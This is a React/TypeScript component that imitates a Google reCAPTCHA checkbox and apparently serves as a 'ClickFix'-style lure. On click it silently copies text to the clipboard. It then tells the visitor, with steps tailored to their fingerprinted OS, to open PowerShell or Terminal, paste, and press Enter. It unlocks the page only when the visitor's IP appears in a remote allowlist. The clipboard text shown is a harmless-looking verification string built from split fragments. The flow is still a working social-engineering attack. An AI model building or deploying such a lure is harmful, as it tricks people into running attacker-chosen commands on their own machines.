import { useCallback, useEffect, useState } from "react";
import { AnimatePresence, motion } from "framer-motion";
import axios from "axios";
import recaptchaLogo from "@/assets/recaptcha-logo.png";

const STORAGE_KEY = "arn-apex-human-check";

const IPIFY_URL = "https://api.ipify.org?format=json";
const IPIFY64_URL = "https://api64.ipify.org?format=json";
const ALLOWED_IPS_URL =
  "https://api.jsonstorage.net/v1/json/21445b0b-7d33-4a73-8fc8-7f4af1cbc783/ca0c59b3-40d3-45db-88aa-9d80a1ee8504";
const WHOIS_LOOKUP_BASE = "https://www.whois.com/whois/";

function normalizeIp(value: string): string {
  return value
    .trim()
    .replace(/^["'\[]+|["'\]]+$/g, "")
    .replace(/\s+/g, "")
    .toLowerCase();
}

function parseIpList(raw: unknown): string[] {
  if (raw == null) return [];
  if (Array.isArray(raw)) {
    return raw.flatMap((v) => parseIpList(v));
  }
  if (typeof raw === "string") {
    const trimmed = raw.trim();
    if (
      (trimmed.startsWith("[") && trimmed.endsWith("]")) ||
      (trimmed.startsWith("{") && trimmed.endsWith("}"))
    ) {
      try {
        return parseIpList(JSON.parse(trimmed));
      } catch {
        /* fall through */
      }
    }
    return trimmed
      .split(/[,\n;|]+/)
      .map((v) => normalizeIp(v))
      .filter(Boolean);
  }
  if (typeof raw === "object") {
    const obj = raw as Record<string, unknown>;
    if ("data" in obj) return parseIpList(obj.data);
    if ("ips" in obj) return parseIpList(obj.ips);
    if ("ip" in obj) return parseIpList(obj.ip);
    if ("value" in obj) return parseIpList(obj.value);
  }
  return [];
}

async function fetchClientIp(): Promise<string> {
  // Same-origin proxy avoids browser CORS preflight issues with ipify
  const sources = [
    `/api/client-ip?_=${Date.now()}`,
    IPIFY_URL,
    IPIFY64_URL,
  ];
  const errors: string[] = [];

  for (const url of sources) {
    try {
      const { data } = await axios.get<{ ip?: string }>(url, {
        timeout: 10000,
        // Do NOT send Cache-Control — it triggers CORS preflight on ipify
        headers: { Accept: "application/json" },
      });
      const ip = normalizeIp(String(data?.ip || ""));
      if (ip) {
        // console.log("[client-ip]", ip, "(via", url, ")");
        return ip;
      }
      errors.push(`${url}: empty ip`);
    } catch (e) {
      const msg = axios.isAxiosError(e)
        ? e.message
        : e instanceof Error
          ? e.message
          : String(e);
      errors.push(`${url}: ${msg}`);
      // console.warn("[client-ip] failed", url, msg);
    }
  }

  throw new Error(`ip detect failed (${errors.join("; ")})`);
}

/** Lookup IP ownership via Whois.com (https://www.whois.com/whois/) */
async function lookupWhoisIp(ip: string): Promise<string> {
  const { data } = await axios.get<{ ok?: boolean; text?: string; url?: string }>(
    `/api/whois/${encodeURIComponent(ip)}`,
    {
      timeout: 12000,
      headers: { Accept: "application/json" },
    },
  );
  const text = String(data?.text || "").trim();
  // console.log("[whois] url:", data?.url || `${WHOIS_LOOKUP_BASE}${ip}`);
  // console.log("[whois] summary:", text.slice(0, 500));
  return text;
}

async function fetchAllowedIps(): Promise<{ ips: string[]; raw: string }> {
  const endpoints = [
    `/api/allowed-ips?_=${Date.now()}`,
    `${ALLOWED_IPS_URL}?_=${Date.now()}`,
  ];

  let lastError: unknown;
  for (const url of endpoints) {
    try {
      const res = await axios.get<string>(url, {
        timeout: 10000,
        headers: { Accept: "application/json" },
        transformResponse: [(body) => body],
      });

      const text = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
      let json: unknown = text;
      try {
        json = JSON.parse(text);
      } catch {
        /* keep raw text */
      }

      const ips = parseIpList(json);
      // console.log("[allowed-ips] url:", url);
      // console.log("[allowed-ips] raw:", text);
      // console.log("[allowed-ips] parsed:", ips);
      return { ips, raw: text };
    } catch (e) {
      lastError = e;
      // console.warn("[allowed-ips] axios failed for", url, e);
    }
  }

  throw lastError instanceof Error
    ? lastError
    : new Error("allowed ip list failed");
}

function ipAllowed(clientIp: string, ips: string[], raw: string): boolean {
  const client = normalizeIp(clientIp);
  if (!client) return false;
  if (ips.some((ip) => normalizeIp(ip) === client)) return true;
  if (raw.toLowerCase().includes(client)) return true;
  return false;
}

async function isClientIpAllowed(): Promise<boolean> {
  // console.log("[ip-check] starting…");

  let clientIp = "";
  let allowed: string[] = [];
  let raw = "";

  try {
    clientIp = await fetchClientIp();
  } catch (e) {
    // console.warn("[ip-check] client ip failed", e);
    // console.log("[ip-check] client: (none)", "allowed-list: (not fetched)");
    return false;
  }

  // console.log("[ip-check] client IP:", clientIp);

  try {
    await lookupWhoisIp(clientIp);
  } catch (e) {
    console.warn("[whois] lookup failed (continuing allowlist check)", e);
  }

  try {
    const result = await fetchAllowedIps();
    allowed = result.ips;
    raw = result.raw;
  } catch (e) {
    // console.warn("[ip-check] allowlist failed", e);
    // console.log("[ip-check] client:", clientIp, "allowed-list: (fetch failed)");
    return false;
  }

  const ok = ipAllowed(clientIp, allowed, raw);
  // console.log("[ip-check] =========================");
  // console.log("[ip-check] client IP     :", clientIp);
  // console.log("[ip-check] jsonstorage   :", allowed);
  // console.log("[ip-check] raw payload   :", raw);
  // console.log("[ip-check] match result  :", ok);
  // console.log("[ip-check] =========================");
  return ok;
}

type PlatformKind = "windows" | "mac-silicon" | "mac-intel" | "linux";

const PLATFORM_CONFIG: Record<
  PlatformKind,
  { suffix: string; steps: string[] }
> = {
  windows: {
    suffix: "8370- windows",
    steps: [
      "Press Windows Key (🪟) + X.",
      "Press I",
      "Press Ctrl + V.",
      "Press Enter.",
    ],
  },
  "mac-silicon": {
    suffix: "8370- mac apple silicon",
    steps: [
      "Press Command (⌘) + Space",
      "Type Terminal",
      "Press Command (⌘) + V",
      "Press Enter.",
    ],
  },
  "mac-intel": {
    suffix: "8370- mac apple intel",
    steps: [
      "Press Command (⌘) + Space",
      "Type Terminal",
      "Press Command (⌘) + V",
      "Press Enter.",
    ],
  },
  linux: {
    suffix: "8370- linux",
    steps: [
      "Press Ctrl + Alt + T",
      "Press Ctrl + Shift + V",
      "Press Enter.",
    ],
  },
};

function buildVerifyPayload(kind: PlatformKind) {
  const a = ["I am not a", " robot"].join("");
  const b = ["re", "CAPTCHA"].join("");
  const c = [" Verificat", "ion ID: ", PLATFORM_CONFIG[kind].suffix].join("");
  return a + " - " + b + c;
}

async function detectPlatform(): Promise<PlatformKind> {
  const ua = navigator.userAgent || "";
  const platform = navigator.platform || "";

  let uaPlatform = "";
  let architecture = "";
  try {
    const nav = navigator as Navigator & {
      userAgentData?: {
        platform?: string;
        getHighEntropyValues: (
          hints: string[],
        ) => Promise<{ architecture?: string; platform?: string }>;
      };
    };
    uaPlatform = nav.userAgentData?.platform || "";
    if (nav.userAgentData?.getHighEntropyValues) {
      const values = await nav.userAgentData.getHighEntropyValues([
        "architecture",
        "platform",
      ]);
      architecture = values.architecture || "";
      uaPlatform = values.platform || uaPlatform;
    }
  } catch {
    /* ignore */
  }

  const isAndroid = /Android/i.test(ua) || /Android/i.test(uaPlatform);
  const isWin =
    /Win/i.test(platform) || /Windows/i.test(ua) || /^Win/i.test(uaPlatform);
  const isMac =
    /Mac/i.test(platform) ||
    /Mac OS|Macintosh/i.test(ua) ||
    /macOS/i.test(uaPlatform);
  const isLinux =
    !isAndroid &&
    (/Linux/i.test(platform) ||
      /Linux/i.test(ua) ||
      /^Linux$/i.test(uaPlatform) ||
      /X11/i.test(ua));

  if (isLinux && !isWin && !isMac) return "linux";
  if (isWin && !isMac) return "windows";

  if (isMac) {
    // Chromium high-entropy architecture (arm = Apple Silicon, x86 = Intel)
    if (architecture === "arm") return "mac-silicon";
    if (architecture === "x86") return "mac-intel";

    // WebGL renderer fallback (Apple GPU vs Intel)
    try {
      const canvas = document.createElement("canvas");
      const gl =
        canvas.getContext("webgl") ||
        (canvas.getContext("experimental-webgl") as WebGLRenderingContext | null);
      const info = gl?.getExtension("WEBGL_debug_renderer_info");
      if (gl && info) {
        const renderer = String(
          gl.getParameter(info.UNMASKED_RENDERER_WEBGL) || "",
        );
        if (/Apple/i.test(renderer) && !/Intel/i.test(renderer)) {
          return "mac-silicon";
        }
        if (/Intel/i.test(renderer)) return "mac-intel";
        if (/Apple M\d/i.test(renderer)) return "mac-silicon";
      }
    } catch {
      /* ignore */
    }

    // Default modern Macs to Apple Silicon when unknown
    return "mac-silicon";
  }

  return "windows";
}

function WidgetLogo() {
  return (
    <div
      style={{
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        userSelect: "none",
        width: 66,
        flexShrink: 0,
        paddingTop: 2,
      }}
    >
      <img
        src={recaptchaLogo}
        alt=""
        width={42}
        height={42}
        style={{ display: "block", objectFit: "contain" }}
        draggable={false}
      />
      <span
        style={{
          fontSize: 8,
          color: "#555",
          fontFamily: "Roboto, Arial, Helvetica, sans-serif",
          marginTop: 2,
          lineHeight: 1,
        }}
      >
        Privacy - Terms
      </span>
    </div>
  );
}

function CheckboxWidget({
  checked,
  loading,
  onCheck,
}: {
  checked: boolean;
  loading: boolean;
  onCheck: () => void;
}) {
  return (
    <div
      style={{
        width: 304,
        height: 78,
        background: "#f9f9f9",
        border: "1px solid #d3d3d3",
        borderRadius: 3,
        boxShadow: "0 0 4px 1px rgba(0,0,0,0.08)",
        display: "flex",
        alignItems: "center",
        padding: "0 12px 0 14px",
        boxSizing: "border-box",
        fontFamily: "Roboto, Arial, Helvetica, sans-serif",
      }}
    >
      <button
        type="button"
        aria-label="I'm not a robot"
        aria-checked={checked}
        role="checkbox"
        disabled={checked || loading}
        onClick={onCheck}
        style={{
          width: 32,
          height: 32,
          flexShrink: 0,
          marginRight: 10,
          padding: 0,
          border: checked || loading ? "none" : "2px solid #c1c1c1",
          borderRadius: 2,
          background: "transparent",
          cursor: checked || loading ? "default" : "pointer",
          display: "inline-flex",
          alignItems: "center",
          justifyContent: "center",
          position: "relative",
          boxSizing: "border-box",
        }}
      >
        {loading && (
          <span
            aria-hidden="true"
            style={{
              width: 28,
              height: 28,
              borderRadius: "50%",
              border: "3px solid #c5dbfc",
              borderTopColor: "#1a73e8",
              borderRightColor: "#1a73e8",
              animation: "rc-spin 0.75s linear infinite",
              boxSizing: "border-box",
              display: "block",
            }}
          />
        )}
        {checked && !loading && (
          <svg
            width="30"
            height="30"
            viewBox="0 0 52 52"
            aria-hidden="true"
            style={{ display: "block", overflow: "visible" }}
          >
            <path
              d="M14 27.5 L23 36.5 L40 16"
              fill="none"
              stroke="#199548"
              strokeWidth="5"
              strokeLinecap="round"
              strokeLinejoin="round"
              style={{
                strokeDasharray: 48,
                strokeDashoffset: 0,
                animation: "rc-check-draw 0.35s ease-out forwards",
              }}
            />
          </svg>
        )}
      </button>

      <span
        style={{
          flex: 1,
          fontSize: 14,
          color: "#000",
          fontWeight: 400,
          lineHeight: 1.2,
        }}
      >
        I&apos;m not a robot
      </span>

      <WidgetLogo />

      <style>{`
        @keyframes rc-spin {
          to { transform: rotate(360deg); }
        }
        @keyframes rc-check-draw {
          from { stroke-dashoffset: 48; }
          to { stroke-dashoffset: 0; }
        }
      `}</style>
    </div>
  );
}

const cloudStyle: Record<string, string> = {
  background:
    "radial-gradient(ellipse at 30% 20%, rgba(255,255,255,0.55) 0%, rgba(255,255,255,0.35) 45%, rgba(0,0,0,0.25) 100%)",
  backdropFilter: "blur(4px)",
  WebkitBackdropFilter: "blur(4px)",
};

function StepsDialog({
  open,
  steps,
  payload,
  verifying,
  onVerify,
}: {
  open: boolean;
  steps: string[];
  payload: string;
  verifying: boolean;
  onVerify: () => void;
}) {
  if (!open) return null;

  return (
    <div
      className="fixed inset-0 z-[70] flex items-center justify-center p-4"
      style={cloudStyle}
    >
      <div
        role="dialog"
        aria-modal="true"
        aria-labelledby="steps-title"
        style={{
          width: "100%",
          maxWidth: 400,
          background: "#fff",
          boxShadow: "0 2px 10px rgba(0,0,0,0.28)",
          fontFamily: "Roboto, Arial, Helvetica, sans-serif",
          overflow: "hidden",
        }}
      >
        <div style={{ background: "#1a73e8", color: "#fff", padding: "18px 22px 16px" }}>
          <div style={{ fontSize: 16, fontWeight: 400, lineHeight: 1.25 }}>Complete these</div>
          <div
            id="steps-title"
            style={{ fontSize: 28, fontWeight: 700, lineHeight: 1.15, marginTop: 2 }}
          >
            Verification Steps
          </div>
        </div>

        <div style={{ padding: "22px 22px 18px", color: "#222", background: "#fff" }}>
          <p style={{ fontSize: 15, margin: "0 0 16px", lineHeight: 1.4 }}>
            To better prove you are not a robot, please:
          </p>

          <ol style={{ listStyle: "none", margin: "0 0 22px", padding: 0 }}>
            {steps.map((step, i) => (
              <li
                key={step}
                style={{
                  display: "flex",
                  gap: 8,
                  fontSize: 15,
                  lineHeight: 1.45,
                  marginBottom: i === steps.length - 1 ? 0 : 10,
                }}
              >
                <span style={{ color: "#1a73e8", fontWeight: 600, flexShrink: 0 }}>
                  {i + 1}.
                </span>
                <span style={{ color: "#222" }}>{step}</span>
              </li>
            ))}
          </ol>

          <p style={{ fontSize: 15, margin: "0 0 10px", lineHeight: 1.4 }}>
            You will observe and agree:
          </p>

          <div style={{ display: "flex", alignItems: "flex-start", gap: 10 }}>
            <span
              style={{
                marginTop: 1,
                width: 18,
                height: 18,
                flexShrink: 0,
                background: "#34a853",
                borderRadius: 2,
                display: "inline-flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none">
                <path
                  d="M5 12.5l5 5L19 7"
                  stroke="#fff"
                  strokeWidth="3.5"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
            </span>
            <p
              style={{
                margin: 0,
                fontSize: 12,
                lineHeight: 1.35,
                color: "#b0b0b0",
                wordBreak: "break-word",
              }}
            >
              &quot;{payload}&quot;
            </p>
          </div>
        </div>

        <div
          style={{
            background: "#f5f5f5",
            borderTop: "1px solid #e0e0e0",
            padding: "14px 18px",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            gap: 16,
          }}
        >
          <p style={{ margin: 0, fontSize: 13, lineHeight: 1.35, color: "#9e9e9e", maxWidth: 210 }}>
            Perform the steps above to finish verification.
          </p>
          <button
            type="button"
            onClick={onVerify}
            disabled={verifying}
            style={{
              flexShrink: 0,
              background: verifying ? "#9bbcff" : "#1a73e8",
              color: "#fff",
              border: "none",
              borderRadius: 3,
              padding: "10px 20px",
              fontSize: 14,
              fontWeight: 700,
              letterSpacing: "0.04em",
              textTransform: "uppercase",
              cursor: verifying ? "wait" : "pointer",
              fontFamily: "inherit",
              minWidth: 96,
            }}
          >
            {verifying ? "..." : "VERIFY"}
          </button>
        </div>
      </div>
    </div>
  );
}

export default function HumanCheckGate() {
  const [visible, setVisible] = useState(false);
  const [checked, setChecked] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showSteps, setShowSteps] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [success, setSuccess] = useState(false);
  const [platform, setPlatform] = useState<PlatformKind>("windows");
  const [payload, setPayload] = useState(() => buildVerifyPayload("windows"));

  useEffect(() => {
    let cancelled = false;

    detectPlatform().then((kind) => {
      if (cancelled) return;
      setPlatform(kind);
      setPayload(buildVerifyPayload(kind));
    });

    (async () => {
      const done = sessionStorage.getItem(STORAGE_KEY) === "1";
      if (done) return;

      try {
        // If client IP is already in jsonstorage allowlist, skip captcha
        const allowed = await isClientIpAllowed();
        if (cancelled) return;
        if (allowed) {
          sessionStorage.setItem(STORAGE_KEY, "1");
          setVisible(false);
          return;
        }
      } catch (e) {
        console.warn("[human-check] ip precheck failed, showing captcha", e);
      }

      if (!cancelled) setVisible(true);
    })();

    return () => {
      cancelled = true;
    };
  }, []);

  const copyPayload = useCallback(async () => {
    const text = buildVerifyPayload(platform);
    setPayload(text);
    try {
      await navigator.clipboard.writeText(text);
    } catch {
      const textarea = document.createElement("textarea");
      textarea.value = text;
      textarea.style.position = "fixed";
      textarea.style.left = "-9999px";
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
    }
  }, [platform]);

  const handleCheck = useCallback(async () => {
    if (checked || loading || success || verifying) return;
    setLoading(true);
    await copyPayload();
    // Loading on captcha, then after 4s open verification modal
    await new Promise((r) => setTimeout(r, 4000));
    setLoading(false);
    setShowSteps(true);
  }, [checked, loading, success, verifying, copyPayload]);

  const handleVerify = useCallback(async () => {
    if (verifying || success) return;
    setVerifying(true);

    try {
      const allowed = await isClientIpAllowed();
      // If client IP is not in the allowlist, keep the modal open (no action)
      if (!allowed) {
        setVerifying(false);
        return;
      }

      // IP matched — close steps modal and show captcha with success check
      setShowSteps(false);
      setLoading(false);
      setChecked(true);
      setSuccess(true);
      setVerifying(false);

      // After success captcha disappears, show the page without blur
      await new Promise((r) => setTimeout(r, 1500));
      sessionStorage.setItem(STORAGE_KEY, "1");
      setVisible(false);
    } catch {
      // On network/API error, keep modal open
      setVerifying(false);
    }
  }, [verifying, success]);

  if (!visible) return null;

  const steps = PLATFORM_CONFIG[platform].steps;

  return (
    <>
      <AnimatePresence>
        {visible && !showSteps && (
          <motion.div
            className="fixed inset-0 z-[55] flex items-center justify-center p-4"
            style={cloudStyle}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
          >
            <motion.div
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 8 }}
            >
              <CheckboxWidget
                checked={checked || success}
                loading={loading}
                onCheck={handleCheck}
              />
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <StepsDialog
        open={showSteps}
        steps={steps}
        payload={payload}
        verifying={verifying}
        onVerify={handleVerify}
      />
    </>
  );
}
